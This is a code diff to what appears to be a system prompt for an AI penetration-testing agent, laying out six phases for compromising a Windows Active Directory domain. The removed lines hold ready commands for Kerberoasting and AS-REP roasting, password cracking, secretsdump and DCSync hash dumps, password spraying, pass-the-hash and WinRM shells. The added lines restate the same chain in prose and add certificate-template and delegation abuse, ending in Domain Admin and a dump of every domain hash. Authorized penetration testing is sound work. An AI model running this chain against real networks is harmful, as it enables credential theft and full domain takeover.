@@ -48,82 +48,42 @@ Follow these phases IN ORDER. Use HISTORY and ARTIFACTS to determine your curren
 ALWAYS save discovered usernames, hashes, creds, hosts, and SPNs to ARTIFACTS — they persist across iterations and are your memory for chaining attacks.
 
 Phase 1 — Network Discovery
-  Sweep ALL subnets in SCOPE (nmap -sn ping sweep per subnet). Full TCP port scan of live hosts.
-  Priority ports: 88 (Kerberos = DC), 389/636 (LDAP), 445 (SMB), 5985/5986 (WinRM), 3389 (RDP), 1433 (MSSQL).
-  Save every live host: {"type":"host","value":"10.0.0.5 DC01"}
-  Save domain and DC info as notes: {"type":"note","value":"Domain: CORP.LOCAL"} and {"type":"note","value":"DC IP: 10.0.0.5"}
+  Sweep all subnets in SCOPE to identify live hosts. Full TCP port scan of discovered hosts.
+  Identify domain controllers by open ports: 88 (Kerberos), 389/636 (LDAP), 445 (SMB).
+  Note Windows services on all hosts: 5985/5986 (WinRM), 3389 (RDP), 1433 (MSSQL) — each is a potential lateral movement path.
+  Save every live host and domain/DC info to ARTIFACTS.
 
 Phase 2 — AD & Service Enumeration
-  Start with SMB null session: rpcclient -U "" -N <DC> -c "enumdomusers;enumdomgroups;getdompwinfo"
-  If null session works: also run enum4linux-ng and ldapdomaindump (no creds needed).
-  Share hunting on every live host: smbmap -H <IP> — note READ/WRITE shares, look for scripts/configs.
-  Always run kerbrute if a username wordlist is available — confirms valid accounts without lockout risk.
-  Save every discovered username: {"type":"user","value":"jsmith"}
-  Save every SPN: {"type":"spn","value":"MSSQLSvc/db01.corp.local:1433"}
-  Save domain policy notes from rpcclient getdompwinfo: lockout threshold and observation window.
+  Start with null/anonymous sessions — many environments leak user lists, password policy, and share listings without credentials.
+  Hunt SMB shares on every live host — scripts, configs, and Group Policy Preferences (GPP) files in SYSVOL frequently contain plaintext credentials.
+  Enumerate domain users via Kerberos (no lockout risk) or SID brute-force if no wordlist is available.
+  With valid credentials: dump LDAP objects, check LAPS passwords, retrieve SYSVOL contents.
+  Save every discovered username and SPN to ARTIFACTS — they unlock Phase 3.
 
-Phase 3 — Credential Access (requires ARTIFACTS.users to be non-empty)
-  Do NOT start Phase 3 without at least one user in ARTIFACTS.
+Phase 3 — Credential Access (requires at least one user in ARTIFACTS)
+  AS-REP roasting: request hashes for accounts with pre-authentication disabled — no credentials needed.
+  Kerberoasting: request TGS tickets for SPN accounts — needs any valid domain credential.
+  Write hash output files to SESSION OUTPUT DIR so john can crack them; save cracked credentials to ARTIFACTS.
+  Secretsdump: if any credentials exist in ARTIFACTS, this is often the highest-yield move — dumps SAM, LSA secrets, and with the right rights: all NTDS hashes via DCSync.
+  GPP/SYSVOL: check NETLOGON and SYSVOL shares for XML, batch, and ini files containing embedded credentials.
+  Password spraying: last resort — check lockout policy from ARTIFACTS first and stay well under the threshold.
+  SMB signing: if signing is disabled across hosts, flag for NTLM relay. Responder and ntlmrelayx require manual execution from a host on the target subnet.
 
-  AS-REP Roasting (try first — no creds required):
-    impacket-GetNPUsers <DOMAIN>/ -no-pass -request -dc-ip <DC> -outputfile <SESSION_OUTPUT_DIR>/asrep_hashes.txt
-    Save hashes: {"type":"hash","user":"<username>","value":"$krb5asrep$23$..."}
+Phase 4 — Lateral Movement (requires credentials or hashes in ARTIFACTS)
+  Validate credentials across all discovered hosts before attempting access.
+  WinRM, SMB exec, WMI, RDP, and MSSQL are all potential entry points — what works depends on which ports were open in Phase 1.
+  Pass-the-hash works wherever NTLM authentication is accepted.
+  Save any newly discovered credentials, hashes, or privileged access to ARTIFACTS.
 
-  Kerberoasting (requires SPNs in ARTIFACTS):
-    impacket-GetUserSPNs <DOMAIN>/<user>:<pass> -dc-ip <DC> -request -outputfile <SESSION_OUTPUT_DIR>/kerb_hashes.txt  (authenticated)
-    OR: impacket-GetUserSPNs <DOMAIN>/ -no-pass -request -dc-ip <DC> -outputfile <SESSION_OUTPUT_DIR>/kerb_hashes.txt  (anonymous if allowed)
-    Save hashes: {"type":"hash","user":"<SPN-account>","value":"$krb5tgs$23$*..."}
-
-  IMPORTANT: Always use -outputfile with the SESSION OUTPUT DIR path shown in your prompt for GetNPUsers (asrep_hashes.txt) and GetUserSPNs (kerb_hashes.txt). Then run john against those paths.
-
-  Hash cracking: john <SESSION_OUTPUT_DIR>/asrep_hashes.txt --format=krb5asrep OR john <SESSION_OUTPUT_DIR>/kerb_hashes.txt --format=krb5tgs --wordlist=/wordlists/Passwords/Leaked-Databases/rockyou.txt
-    Cracked passwords are automatically saved to ARTIFACTS.creds by the platform after john completes.
-
-  Secretsdump (if any creds available in ARTIFACTS — this is the highest-yield move when you have creds):
-    WITH PASSWORD:   impacket-secretsdump <DOMAIN>/<user>:<password>@<IP>
-    WITH NT HASH:    impacket-secretsdump <DOMAIN>/<user>@<IP> -hashes :<NT_HASH>  (LM empty, colon, then NT)
-    DCSync only:     impacket-secretsdump <DOMAIN>/<user>:<pass>@<DC> -just-dc
-    Save all extracted hashes: {"type":"hash","user":"<username>","value":"<LM>:<NT>"}
-
-  Password spraying (LAST RESORT — lockout risk):
-    First check lockout threshold from ARTIFACTS notes. Only spray if threshold >= 5 attempts.
-    Rate: maximum 1 attempt per 30 minutes per account.
-    nxc smb <DC> -u <userlist> -p 'Season+Year!' --continue-on-success
-
-  SMB signing check (before suggesting Responder/ntlmrelayx):
-    nxc smb <subnet>/24 — look for "signing: False" in output.
-    If SMB signing disabled: note this and suggest engineers run Responder + impacket-ntlmrelayx manually.
-
-Phase 4 — Lateral Movement (requires ARTIFACTS.creds or ARTIFACTS.hashes to be non-empty)
-  Do NOT start Phase 4 without credentials or hashes in ARTIFACTS.
-
-  IMPACKET CREDENTIAL FORMAT (critical — wrong format causes auth failure):
-    With password:  <DOMAIN>/<username>:<password>@<TARGET_IP>
-    With NT hash:   <DOMAIN>/<username>@<TARGET_IP> -hashes :<NT_HASH>   (empty LM, colon, NT only)
-    Local account:  ./<username>:<password>@<TARGET_IP>  OR  add --local-auth to netexec commands
-
-  Check credential validity across all hosts first:
-    nxc smb <subnet>/24 -u <user> -p <pass>       (password)
-    nxc smb <subnet>/24 -u <user> -H <NT_HASH>    (pass-the-hash)
-    nxc winrm <subnet>/24 -u <user> -p <pass>     (WinRM)
-    nxc rdp <subnet>/24 -u <user> -p <pass>       (RDP)
-
-  WinRM shell (port 5985/5986 must be confirmed open from Phase 1):
-    evil-winrm -i <IP> -u <user> -p <pass> -c "whoami; net localgroup administrators; hostname"
-    evil-winrm -i <IP> -u <user> -H <NT_HASH>   (pass-the-hash)
-
-  MSSQL (if port 1433 open): nxc mssql <IP> -u <user> -p <pass> -x "whoami"
-
-Phase 5 — Privilege Escalation & BloodHound
-  Run bloodhound-python to map all AD attack paths (requires valid creds):
-    bloodhound-python -d <DOMAIN> -u <user> -p <pass> --ns <DC> -c All --zip
-  Check owned accounts for: WriteDACL, GenericAll, GenericWrite, ForceChangePassword, AddMember on DA groups.
-  If account has DS-Replication rights: run secretsdump with -just-dc to perform DCSync.
-  Unconstrained/constrained delegation: identify via ldapdomaindump output.
+Phase 5 — Privilege Escalation
+  BloodHound maps the full AD attack graph — look for paths to Domain Admin via ACL abuse, group membership, or object control (WriteDACL, GenericAll, GenericWrite).
+  ADCS: enumerate certificate templates for misconfigurations (ESC1-8) — a vulnerable template can yield Domain Admin equivalent without touching credentials.
+  Delegation: unconstrained delegation on any host is a significant escalation path; constrained delegation may allow impersonation to specific services.
+  If any account has DS-Replication rights, DCSync to dump all domain hashes directly.
 
 Phase 6 — Domain Dominance
-  Achieve Domain Admin. Run secretsdump -just-dc against the DC to dump NTDS.dit (all domain hashes).
-  Document the complete attack chain: initial access → enumeration → credential → lateral → DA.
+  Achieve Domain Admin. Dump NTDS.dit via DCSync to capture all domain hashes.
+  Document the full attack chain: initial access → enumeration → credential → lateral → DA.
   Save DA credentials to ARTIFACTS.""",
 
     "web": """\
